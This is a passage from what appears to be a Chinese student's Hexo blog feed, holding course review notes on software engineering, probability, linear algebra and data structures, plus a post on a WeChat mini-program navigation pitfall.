<li>Functionality addition to add new features and to support new requirements. <strong>增加功能应付新需求</strong></li>
</ol>
<h3 id="Quality-management（质量管理）"><a href="#Quality-management（质量管理）" class="headerlink" title="Quality management（质量管理）"></a>Quality management（质量管理）</h3><p>ISO 9001 framework – the standards for developing software standards ———-&gt;<strong>ISO 9001框架-开发软件标准的标准</strong></p>
<h4 id="Reviews-and-inspections-（审查和检查）"><a href="#Reviews-and-inspections-（审查和检查）" class="headerlink" title="Reviews and inspections （审查和检查）"></a>Reviews and inspections （审查和检查）</h4><p>审查是指对该团队的成果是否遵循质量标准</p>
<p>检查是指检查代码，找bug~</p>
<h3 id="Configuration-management-（结构管理）"><a href="#Configuration-management-（结构管理）" class="headerlink" title="Configuration management （结构管理）"></a>Configuration management （结构管理）</h3><h4 id="Version-management"><a href="#Version-management" class="headerlink" title="Version management"></a>Version management</h4><p>Keeping track of the multiple versions of system components and ensuring that changes made to components by different developers do not interfere with each other.</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/13/0506e17fabfbbe7b.png" alt=""></p>
<h5 id="Centralized-version-control-（集中式版本控制）"><a href="#Centralized-version-control-（集中式版本控制）" class="headerlink" title="Centralized version control （集中式版本控制）"></a>Centralized version control （集中式版本控制）</h5><p>Developers check out components or directories of components from the project repository into their private workspace and work on these copies in their private workspace. When their changes are complete, they check-in the components back to the repository. </p>
<p>将仓库的组件拷到私人工作区再修改，修改结束后再放回仓库</p>
<h5 id="Distributed-version-control-（分布式版本控制）"><a href="#Distributed-version-control-（分布式版本控制）" class="headerlink" title="Distributed version control （分布式版本控制）"></a>Distributed version control （分布式版本控制）</h5><p>A ‘master’ repository is created on a server that maintains the code produced by the development team.Instead of checking out the files that they need, a developer creates a clone of the project repository that is downloaded and installed on their computer. Developers work on the files required and maintain the new versions on their private repository on their own computer. When changes are done, they ‘commit’ these changes and update their private server repository. They may then ‘push’ these changes to the project repository. </p>
<p>……没啥好说的，就是GitHub项目管理的那种方式</p>
<h4 id="System-building"><a href="#System-building" class="headerlink" title="System building"></a>System building</h4><p>The process of assembling program components, data and libraries, then compiling these to create an executable system.</p>
<p>组装组件，编译生成可执行系统</p>
<h4 id="Change-management-（变更需求）"><a href="#Change-management-（变更需求）" class="headerlink" title="Change management （变更需求）"></a>Change management （变更需求）</h4><p>Keeping track of requests for changes to the software from customers and developers, working out the costs and impact of changes, and deciding the changes should be implemented.</p>
<p>出生行为</p>
<h4 id="Release-management（发布管理）"><a href="#Release-management（发布管理）" class="headerlink" title="Release management（发布管理）"></a>Release management（发布管理）</h4><p>Preparing software for external release and keeping track of the system versions that have been released for customer use.</p>
<h3 id="Software-reuse"><a href="#Software-reuse" class="headerlink" title="Software reuse"></a>Software reuse</h3><h4 id="Reuse-based-software-engineering（基于重用的软件工程）"><a href="#Reuse-based-software-engineering（基于重用的软件工程）" class="headerlink" title="Reuse-based software engineering（基于重用的软件工程）"></a>Reuse-based software engineering（基于重用的软件工程）</h4><p>目的：设计更快，花费更少</p>
<p>Software reuse may introduce additional costs and risks to software maintenance and evolution.<strong>额外风险</strong></p>
<ul>
<li>Application frameworks</li>
<li>Software product lines </li>
<li>Application system reuse</li>
</ul>
<h5 id="Application-frameworks（框架）"><a href="#Application-frameworks（框架）" class="headerlink" title="Application frameworks（框架）"></a>Application frameworks（框架）</h5><p>Frameworks are moderately large entities that can be reused. They are somewhere between system and component reuse.</p>
<p>Frameworks are a sub-system design made up of a collection of abstract and concrete classes and the interfaces between them.</p>
<p>The sub-system is implemented by adding components to fill in parts of the design and by instantiating the abstract classes in the framework.</p>
<h5 id="Base-systems-for-a-software-product-line"><a href="#Base-systems-for-a-software-product-line" class="headerlink" title="Base systems for a software product line"></a>Base systems for a software product line</h5><p><img src="https://s3.bmp.ovh/imgs/2022/12/14/738ec4b1a324e46c.png" alt=""></p>
<h5 id="Application-system-reuse（应用系统重用）"><a href="#Application-system-reuse（应用系统重用）" class="headerlink" title="Application system reuse（应用系统重用）"></a>Application system reuse（应用系统重用）</h5><p>An application system product is a software system that can be adapted for different customers without changing the source code of the system.</p>
<p>Application systems have generic features and so can be used/reused in different environments.</p>
<p>Application system products are adapted by using built-in <strong>configuration mechanisms</strong>（配置机制） that allow the functionality of the system to be <strong>tailored</strong>（定制） to specific customer needs.</p>
<h3 id="Agile-development（敏捷开发）"><a href="#Agile-development（敏捷开发）" class="headerlink" title="Agile development（敏捷开发）"></a>Agile development（敏捷开发）</h3><p>The objectives of agile software development are to deliver functionality quickly, respond quickly to changing specifications and minimise development overheads. </p>
<h4 id="Development-Process-with-Story-Cards"><a href="#Development-Process-with-Story-Cards" class="headerlink" title="Development Process with Story Cards"></a>Development Process with Story Cards</h4><ul>
<li>Consumers create story cards.</li>
<li>Dev team releases stories (i.e. the updated system version) early and often.</li>
</ul>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/14/fd092e4dc783f509.png" alt=""></p>
<h4 id="Extreme-Programming（极限编程）"><a href="#Extreme-Programming（极限编程）" class="headerlink" title="Extreme Programming（极限编程）"></a>Extreme Programming（极限编程）</h4><p>以更好的响应用户需求变化为目标，更强调软件开发的可适应性而不是可预测性</p>
<h5 id="Refactoring-（重构）"><a href="#Refactoring-（重构）" class="headerlink" title="Refactoring （重构）"></a>Refactoring （重构）</h5><p>Examples of refactoring include the reorganization of a class hierarchy to remove <strong>duplicate</strong>（重复的） code, the renaming of attributes and methods, and the replacement of similar code sections, with calls to methods defined in a program library.</p>
<h5 id="Test-first-development-test-driven-development"><a href="#Test-first-development-test-driven-development" class="headerlink" title="Test-first development (test driven development)"></a><strong>Test-first development</strong> (test driven development)</h5><p>逆天编程方式，</p>
<p>传统的：</p>
<ul>
<li>Analyse the business logic, then, implement the function for the logic</li>
<li>Create test cases to test the function</li>
</ul>
<p>逆天的：</p>
<ul>
<li>Create test cases</li>
<li>Write code only to let the function pass the test; just ignore the business logic!</li>
</ul>
<h5 id="Pair-programming（结对编程）"><a href="#Pair-programming（结对编程）" class="headerlink" title="Pair programming（结对编程）"></a>Pair programming（结对编程）</h5><p>两个程序员用一台机子编程…..一个告诉另一个怎么敲，另一个只负责敲</p>
<ul>
<li>Two programmers code simultaneously, but use one computer with one keyboard. </li>
<li>In each pair, one programmer (navigator) tells the other programmer (driver) what to code, and the driver use the keyboard to program. </li>
</ul>
<h4 id="Scrum"><a href="#Scrum" class="headerlink" title="Scrum"></a>Scrum</h4><p>Scrum is a framework to manage an agile project.</p>
<p>管理敏捷项目的框架</p>
<ul>
<li>3 Roles — Product owner, ScrumMaster, Development team </li>
<li>StandUp Meeting — A daily short meeting of the Scrum team that reviews progress and prioritizes work to be done that day..</li>
<li>Sprint — A development iteration (usually 2 to 4 weeks long). </li>
<li>Scrum Board — A Scrum board gives a quick, easy view of the items within the sprint, that the development team is currently working on and has already completed.</li>
</ul>
]]></content>
      <categories>
        <category>大二课程</category>
      </categories>
      <tags>
        <tag>校内课程</tag>
        <tag>复习</tag>
        <tag>导论</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序开发踩坑大全</title>
    <url>/2023/03/14/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<p> 记录一些逆天的坑，第一个就废了我大半个晚上和小半个下午（</p>
<h2 id="路由跳转"><a href="#路由跳转" class="headerlink" title="路由跳转"></a>路由跳转</h2><p>很简单的逻辑，页面跳转，文档也可以直接查到，那就是wx.navigateTo({url:xxxxxx})。很ez，但是就是报错，emmmm，</p>
<p><img src="https://s2.loli.net/2023/03/14/HS2b34dYlZtxLMD.png" alt="路由跳转错误.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VM733 WAService.js:2 Object(env: Windows,mp,1.05.2203070; lib: 2.14.1)</span><br><span class="line">errorReport @ VM733 WAService.js:2</span><br><span class="line">thirdErrorReport @ VM733 WAService.js:2</span><br><span class="line">(anonymous) @ VM733 WAService.js:2</span><br><span class="line">l @ VM733 WAService.js:2</span><br><span class="line">s @ VM733 WAService.js:2</span><br><span class="line">(anonymous) @ VM733 WAService.js:2</span><br><span class="line">value @ VM733 WAService.js:2</span><br><span class="line">e @ VM733 WAService.js:2</span><br><span class="line">(anonymous) @ VM733 WAService.js:2</span><br></pre></td></tr></table></figure>
<p>然后我又把这段送给了chatGPT爷，他说检查语法和路由路径问题，但是标准的路径流程都是正确的，</p>
<p><img src="https://s2.loli.net/2023/03/14/dOBHsJh7rnx1E3W.png" alt="路由配置.png"></p>
<p><img src="https://s2.loli.net/2023/03/14/iweKbG1R9q8ykJm.png" alt="路由配置-引用.png"></p>
<p>但是还是报错，还是不行（</p>
<p>这个时候已经没啥招了，路由的注册，引用都是正常的，但是就是报错且无法跳转，甚至报错信息也看不出来什么，后来我换了一个路径，换成</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="title function_">navigateTo</span>(&#123;</span><br><span class="line">	<span class="attr">url</span>: <span class="string">&#x27;/pages/add/index&#x27;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>欸嘿，居然跳转成功了（当然能成功，因为注册和引用都是正常的。然后就又是不停的实验和检查，最后终于给爷逮到为啥了（</p>
<p><img src="https://s2.loli.net/2023/03/14/rV9Gyl5o7dQzwsY.png" alt="tab菜单底部.png"></p>
<p>就是下面这个玩意，tabBar栏，这四个页面，主页，预约，提醒，个人中心,这四个是加入了tabBar中的，</p>
<p><img src="https://s2.loli.net/2023/03/14/r6LNesUAGRZlaPO.png" alt="tabBar栏.png"></p>
<p>一旦加入进这里的页面，一律不能使用wx.navigateTo跳转，逆天，也不知道这么设计的原因是啥，反正就是不行（</p>
<p>最后，如果想跳转，就必须使用wx.switchTab函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="title function_">switchTab</span>(&#123;</span><br><span class="line">	<span class="attr">url</span>: <span class="string">&#x27;/pages/list/index&#x27;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这样就能跳转了，emmmm，这种报错控制台是看不出来什么的，因此查找原因的整个过程会变得很慢</p>
]]></content>
      <categories>
        <category>项目开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>概率论复习</title>
    <url>/2022/12/23/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p> 关于大二上学期概率论学的稀烂，期末复习知识不进脑子的那点事……</p>
<h2 id="二项随机概率分布"><a href="#二项随机概率分布" class="headerlink" title="二项随机概率分布"></a>二项随机概率分布</h2><p>$b(x;n,p)$代表事件总共发生n次，有x次成功，每次事件成功的概率是p，则事件成功的概率是多少，是$C_n^xp^x(1-p)^{1-x}$。</p>
<h3 id="cdf-概率分布函数"><a href="#cdf-概率分布函数" class="headerlink" title="cdf (概率分布函数)"></a>cdf (概率分布函数)</h3><p>$P(X\leq x)=B(x;n,p)=\sum_{y=0}^xb(y;n,p)$</p>
<p>这玩意实际运算的时候，可以查表orz..</p>
<h3 id="均值和方差"><a href="#均值和方差" class="headerlink" title="均值和方差"></a>均值和方差</h3><p>对于二项分布$X$~$Bin(n,p)$，均值$E(x)=np$，方差$V(x)=np(1-p)$，标准差$\sigma_x=\sqrt{np(1-p)}$。</p>
<p>证明均值的过程：</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/22/8b6e2da791c73a34.png" alt=""></p>
<h3 id="Hypergeometric-Distribution-amp-Negative-Binomial-Distributions（超几何分布和负二项分布）"><a href="#Hypergeometric-Distribution-amp-Negative-Binomial-Distributions（超几何分布和负二项分布）" class="headerlink" title="Hypergeometric Distribution &amp; Negative Binomial Distributions（超几何分布和负二项分布）"></a>Hypergeometric Distribution &amp; Negative Binomial Distributions（超几何分布和负二项分布）</h3><h4 id="超几何分布"><a href="#超几何分布" class="headerlink" title="超几何分布"></a>超几何分布</h4><p>$P(X=x)=h(x;n,M,N)=\frac{出现x次的次数}{可能情况的次数}=\frac{C<em>M^xC</em>{N-M}^{n-x}}{C_N^n}$，表示总共N个物品，M个特定物品，抽取n次，抽到特定物品x次的概率。</p>
<h5 id="期望和方差"><a href="#期望和方差" class="headerlink" title="期望和方差"></a>期望和方差</h5><p>$E(x)=n\frac{M}{N}$</p>
<p>$V(x)=(\frac{N-n}{N-1})n\frac{M}{N}(1-\frac{M}{N})$</p>
<h4 id="负二项分布"><a href="#负二项分布" class="headerlink" title="负二项分布"></a>负二项分布</h4><p>成功次数固定，实验次数不定</p>
<p>$nb(x;r,p)$，表示x次失败，r次成功，单次成功概率是p，意味着x+r-1次实验之前，是r-1次成功，第x+r次必定成功</p>
<h3 id="泊松分布"><a href="#泊松分布" class="headerlink" title="泊松分布"></a>泊松分布</h3><p>$p(x;\lambda)=\frac{e^{-\lambda}\lambda^x}{x!}$</p>
<p>当二项分布$b(x;n,p)$中n极大且p极小时，可以视为泊松分布$p(x;\lambda)$，$\lambda=np$。</p>
<h4 id="均值和方差-1"><a href="#均值和方差-1" class="headerlink" title="均值和方差"></a>均值和方差</h4><p>都是$\lambda$</p>
<h2 id="pdf（概率密度函数）"><a href="#pdf（概率密度函数）" class="headerlink" title="pdf（概率密度函数）"></a>pdf（概率密度函数）</h2><p>$P(a\leq X\leq b)=\int_a^bf(x)dx$，也就是说，X在区间[a, b]中取某个值的概率是该区间上方和密度函数图下方的面积。f(x)的图形通常被称为密度曲线。</p>
<p>$P(X=c)=\int<em>c^cf(x)dx=\lim</em>{\varepsilon\rightarrow0}\int_{c-\varepsilon}^{c+\varepsilon}f(x)dx=0$。</p>
<p>$P(a\leq X\leq b)=F(b)-F(a)$，前提是求出概率分布函数F(x)，这样可以不用积分辣，而且更直接的是：$P(x\leq a)=F(a)$。</p>
<p>如果x连续分布，概率密度函数f(x)和概率分布函数F(x)存在，且每一个x都存在一个对应的导数F’(x)，则$F’(x)=f(x)$。</p>
<h3 id="期望值与方差"><a href="#期望值与方差" class="headerlink" title="期望值与方差"></a>期望值与方差</h3><p>$\mu<em>x=E(x)=\int</em>{-\infty}^{+\infty}xf(x)dx$，</p>
<p>$E[h(X)]=\int_{-\infty}^{+\infty}h(x)f(x)dx$，或者$E[h(X)]=E(aX+b)=aE(x)+b$。</p>
<p>$V(x)=E(x^2)-[E(x)]^2$。</p>
<h3 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h3><p>$f(x;A,B)=\frac{1}{B-A}$  when $A\leq x\leq B$。另外的部分为0</p>
<h2 id="正态分布"><a href="#正态分布" class="headerlink" title="正态分布"></a>正态分布</h2><h3 id="概率密度函数"><a href="#概率密度函数" class="headerlink" title="概率密度函数"></a>概率密度函数</h3><p>$f(x;\mu,\sigma)=\frac{1}{\sqrt{2\pi}\sigma}e^{-(x-\mu)^2/(2\sigma)^2}$。</p>
<h3 id="标准正态分布"><a href="#标准正态分布" class="headerlink" title="标准正态分布"></a>标准正态分布</h3><p>$f(z;0,1)=\frac{1}{\sqrt{2\pi}}e^{-z^2/2}$      $-\infty&lt;z&lt;+\infty$。</p>
<p>当拿到一个非标准化的正态分布时，通过找到z临界来还原标准正态分布，$z=\frac{X-\mu}{\sigma}$，其中$\mu$是期望，$\sigma$是标准差。</p>
<h3 id="百分位数"><a href="#百分位数" class="headerlink" title="百分位数"></a>百分位数</h3><p>这个就是一个查表的玩意，比如第67个百分位数，就在正态分布表查.6700，所对应的数就是第67个百分位数，是0.44，如果在两个中间，就取中间值。</p>
<h3 id="z数"><a href="#z数" class="headerlink" title="z数"></a>z数</h3><p><img src="https://s3.bmp.ovh/imgs/2022/12/22/7162c01b3829fa3f.png" alt=""></p>
<p>$z_a$的下标表示大于这个数的概率是a，它同时代表了100（1-a）个百分位，也叫z临界值。</p>
<h2 id="指数分布"><a href="#指数分布" class="headerlink" title="指数分布"></a>指数分布</h2><p>$f(X;\lambda)=\begin{cases}\lambda e^{-\lambda x},x\geq1\0,otherwise\end{cases}$</p>
<h3 id="均值和方差-2"><a href="#均值和方差-2" class="headerlink" title="均值和方差"></a>均值和方差</h3><p>$E(X)=\int_0^{\infty}x\lambda e^{-\lambda x}dx$，这么算出来之后捏，是：</p>
<p>$\mu=\frac{1}{\lambda}$，$\sigma^2=\frac{1}{\lambda^2}$。也就是说，无论是均值还是标准差，指数分布这俩是一样的。</p>
<h3 id="概率分布函数"><a href="#概率分布函数" class="headerlink" title="概率分布函数"></a>概率分布函数</h3><p>$F(X;\lambda)=\begin{cases}0,x&lt;0\1-e^{-\lambda x},x\geq0\end{cases}$</p>
<h3 id="伽马函数"><a href="#伽马函数" class="headerlink" title="伽马函数"></a>伽马函数</h3><p>$\gamma(a)=\int_0^\infty x^{a-1}e^{-x}dx$，</p>
<p>性质：</p>
<ul>
<li>对于任意$a&gt;1$，$\gamma(a)=(a-1)*\gamma(a-1)$</li>
<li>对于任意正整数n，$\gamma(n)=(n-1)!$</li>
<li>$\gamma(\frac{1}{2})=\sqrt{\pi}$</li>
</ul>
<h3 id="伽马分布"><a href="#伽马分布" class="headerlink" title="伽马分布"></a>伽马分布</h3><p>就这样演变出了个新的分布：</p>
<p>$f(x;\alpha,\beta)=\begin{cases}\frac{1}{\beta^{\alpha}\gamma(a)}x^{\alpha-1}e^{-x/\beta},x\geq0\0,otherwise\end{cases}$</p>
<h4 id="均值和方差-3"><a href="#均值和方差-3" class="headerlink" title="均值和方差"></a>均值和方差</h4><p>$E(x)=\alpha\beta$</p>
<p>$V(x)=\sigma^2=\alpha\beta^2$</p>
<h4 id="概率分布函数-1"><a href="#概率分布函数-1" class="headerlink" title="概率分布函数"></a>概率分布函数</h4><p>如果是标准的伽马函数，分布是这样的</p>
<p>$F(x;a)=\int_0^x\frac{y^{a-1}e^{-y}}{\gamma(a)}dy$</p>
<h2 id="常见连续性分布的数学期望和方差"><a href="#常见连续性分布的数学期望和方差" class="headerlink" title="常见连续性分布的数学期望和方差"></a>常见连续性分布的数学期望和方差</h2><h3 id="均匀分布-1"><a href="#均匀分布-1" class="headerlink" title="均匀分布"></a>均匀分布</h3><p>$f(x)=\frac{1}{b-a}$当$a&lt;=x&lt;=b$时，$EX=\frac{a+b}{2}$，$DX=\frac{(b-a)^2}{12}$。</p>
<h2 id="协方差：COV-x-y"><a href="#协方差：COV-x-y" class="headerlink" title="协方差：COV(x,y)"></a>协方差：COV(x,y)</h2><h3 id="公式："><a href="#公式：" class="headerlink" title="公式："></a>公式：</h3><h3 id="cov-x-y-E-x-y-ExEy-。"><a href="#cov-x-y-E-x-y-ExEy-。" class="headerlink" title="$cov(x,y)=E(x,y)-ExEy$。"></a>$cov(x,y)=E(x,y)-ExEy$。</h3><p>$f<em>x(x)=\int</em>{-\infty}^{+\infty}f(x,y)dy$           x的范围 </p>
<p>$f<em>y(y)=\int</em>{-\infty}^{+\infty}f(x,y)dx$            y的范围</p>
<p>$E(x)=\int_{a}^{b}xf_x(x)dx$            a,b是x的范围</p>
<p>$E(y)=\int_a^byf_y(y)dy$              a,b概念同上</p>
<p>$E(xy)=\int_a^b\int_c^dxyf(x,y)dxdy$ <strong>这是建立在x，y不独立的基础上的</strong> </p>
<p>$E(xy)=E(x)E(y)$ 当x，y相互独立时期望算法</p>
<h3 id="性质："><a href="#性质：" class="headerlink" title="性质："></a>性质：</h3><ul>
<li>$Cov(x,y)=Cov(y,x)$</li>
<li>$Cov(ax,by)=abCov(x,y)$</li>
<li>$Cov(x_1+x_2,y)=Cov(x_1,y)+Cov(x_2,y)$</li>
<li>$Cov(c,x)=0$ 常数和变量的协方差等于0</li>
<li>x,y独立，$Cov(x,y)=0$ ,但是<strong>协方差为0不能得出x,y独立</strong></li>
</ul>
<h2 id="相关系数-rho"><a href="#相关系数-rho" class="headerlink" title="相关系数$\rho$"></a>相关系数$\rho$</h2><h3 id="公式：-1"><a href="#公式：-1" class="headerlink" title="公式："></a>公式：</h3><p>$\rho=\frac{Cov(x,y)}{\sqrt{Dx}\sqrt{Dy}}$  </p>
<p>Dx和Dy是方差，开根号就是标准差</p>
<p>这里有一个关于方差的公式：$D(x-y)=Dx+Dy-2Cov(x,y)$</p>
<h3 id="性质：-1"><a href="#性质：-1" class="headerlink" title="性质："></a>性质：</h3><p>$\rho$代表了线性关系的相关性，如果$\rho=0$则说明x，y不相关</p>
<p>$|\rho|&lt;1$</p>
<p>$|\rho|=1&lt;=&gt;x和y以p=1成线性关系$ 就是$p(Y=aX+b)=1$</p>
<h3 id="独立和不相关"><a href="#独立和不相关" class="headerlink" title="独立和不相关"></a>独立和不相关</h3><p>x,y独立意思是x和y之间没有关系，互不影响，而x，y不相关的意思是x和y之间没有线性关系（可能有非线性关系）</p>
<p>因此：</p>
<ul>
<li>x，y独立意味着x，y不相关</li>
<li>x，y不相关不一定代表x，y独立</li>
</ul>
<p>另外要想证明x,y独立，需要知道x，y独立的充要条件，即：</p>
<p>$f(x,y)=f_x(x)f_y(y)$</p>
<h2 id="中心距与原点矩"><a href="#中心距与原点矩" class="headerlink" title="中心距与原点矩"></a>中心距与原点矩</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>原点矩：$E(x)^k$ 期望E(x)也叫一阶原点矩</p>
<p>离散：$\sum_{0}^ix_i^kp_i$</p>
<p>连续：$\int_{-\infty}^{\infty}x^kf(x)dx$</p>
<p>中心距：$E(x-E(X))^k$ </p>
<p>离散:$\sum(x_i-E(x))^kp_i$</p>
<p>连续：$\int_{-\infty}^{\infty}(x-E(x))^kf(x)dx$</p>
<ul>
<li>一阶中心距：$E(x-E(x))=E(x)-E(x)=0$</li>
<li>二阶中心矩：$E(x-E(x))^2$ 就是方差</li>
</ul>
]]></content>
      <categories>
        <category>大二课程</category>
      </categories>
      <tags>
        <tag>校内课程</tag>
        <tag>复习</tag>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title>线代预习一些知识</title>
    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
<span id="more"></span>
<ul>
<li><p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
</li>
<li><p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
</li>
<li><p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
<h4 id="施密特正交化步骤："><a href="#施密特正交化步骤：" class="headerlink" title="施密特正交化步骤："></a>施密特正交化步骤：</h4></li>
<li><p><strong><1>.</strong>   $ A=a $</p>
</li>
<li><p><strong><2>.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$ </p>
</li>
<li><p><strong><3>.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}<em>A-\frac{B\tau\</em>c}{B\tau*b}*B $</p>
<h3 id="一些关于行列式的性质："><a href="#一些关于行列式的性质：" class="headerlink" title="一些关于行列式的性质："></a>一些关于行列式的性质：</h3></li>
</ul>
<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
<ol>
<li><p>$|2*A|=2^n*x$</p>
</li>
<li><p>$|-A|=(-1)^n*x$</p>
</li>
<li><p>$|A^2|=x^2$</p>
</li>
<li><p>$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$</p>
</li>
</ol>
<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
<p>矩阵可逆可推出列空间是$R^3$</p>
<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
<p>列空间的维数是他的秩</p>
<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
<h4 id="克雷默法则"><a href="#克雷默法则" class="headerlink" title="克雷默法则"></a>克雷默法则</h4><p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$A^-1=\frac{C\tau}{|A|}$</p>
<p>$A*C\tau=|A|*I$</p>
<h4 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h4><p>特征值的和=矩阵左上右下对角线的和</p>
<p>特征值的乘积等于矩阵的行列式</p>
<h4 id="对角化"><a href="#对角化" class="headerlink" title="对角化"></a>对角化</h4><p>$\Lambda$是特征值依次排列下来的矩阵，只有对角线有元素</p>
<p>X则是特征向量的集合的矩阵</p>
<p>A是原矩阵</p>
<p>有公式：</p>
<p>$\Lambda=X^-1*A*X$</p>
<p>$A=X^-1*\Lambda*X$</p>
]]></content>
      <categories>
        <category>大一课程</category>
      </categories>
      <tags>
        <tag>校内课程</tag>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构复习</title>
    <url>/2023/02/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇文章的目的呢，主要是当做笔记了，现在都已经大二了数据结构与算法还是比较薄弱，感觉都不能叫菜了(哭，所以就写一篇相当于知识体系的博客吧，内容非常的基础，没什么亮点，<del>也没什么看的价值</del>。</p>
<p>首先我们理一理这个数据结构，从大一开始我们就知道什么栈啊表啊什么的，那在这我们做一个简单的总结吧，简单数据结构首先可以分为表栈队树图，当然我知道这么分很垃，但是总体上大概可以看成这几类，那我们就一种一种来看。</p>
<h1 id="表"><a href="#表" class="headerlink" title="表"></a>表</h1><p>首先看表，表这种数据结构很直观，先进先出，也很好理解，这里就记录一下各种不同的表以及实现方式。</p>
<h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p>首先我们先分配出一个数据结构</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  Maxsize 100  <span class="comment">//最大空间</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;<span class="comment">//typedef的作用是把这个结构体等价于类型名SqList</span></span><br><span class="line">	ElemType *elem;<span class="comment">//自定义数据类型，动态分配方式</span></span><br><span class="line"><span class="comment">//  ElemType data[Maxsize]//静态分配方式  </span></span><br><span class="line">	<span class="type">int</span> length; <span class="comment">// 顺序表的长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
<p>顺序表的存储方式如下，它的特点是只要索引正确，可以<strong>立即找到相对应的数值</strong>，对比有指针的那位….另外，第i个元素的值为L,elem[i-1]，这个细节留意一下。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span> <span class="comment">//构造一个空的顺序表L</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">//L加&amp;表示引用类型参数，函数内部的改变跳出函数仍然有效</span></span><br><span class="line"><span class="comment">//不加&amp;内部改变，跳出函数后无效</span></span><br><span class="line">    L.elem=<span class="keyword">new</span> <span class="type">int</span>[Maxsize];    <span class="comment">//为顺序表分配Maxsize个空间</span></span><br><span class="line">    <span class="keyword">if</span>(!L.elem) <span class="keyword">return</span> <span class="literal">false</span>;      <span class="comment">//存储分配失败</span></span><br><span class="line">    L.length=<span class="number">0</span>;				<span class="comment">//空表长度为0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,size</span>):  <span class="comment"># initialization</span></span><br><span class="line">    self.<span class="built_in">max</span>=size        <span class="comment">#表的最大值</span></span><br><span class="line">    self.data=[<span class="literal">None</span>]*self.<span class="built_in">max</span> <span class="comment">#表的值</span></span><br><span class="line">    self.num=<span class="number">0</span>  <span class="comment">#当前该顺序表的长度，空表为0</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/11/09/zmNZ9QCjiFqcWXU.png" alt="image-20221108223419456.png"></p>
<h3 id="插，删，找"><a href="#插，删，找" class="headerlink" title="插，删，找"></a>插，删，找</h3><p>任何一个数据结构都会具备基本的增删改查功能，取值和查找基本相同就不赘述了，这里讲讲插入和删除，首先在顺序表中第<em>i</em>个位置之前插入一个元素<em>e</em>，需要从最后一个元素开始，后移一位，…，直到把第<em>i</em>个元素也后移一位，然后把<em>e</em>放入第<em>i</em>个位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;	 <span class="comment">//i值不合法</span></span><br><span class="line">	<span class="keyword">if</span>(L.length==Maxsize) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//存储空间已满</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;j--)</span><br><span class="line">	    L.elem[j+<span 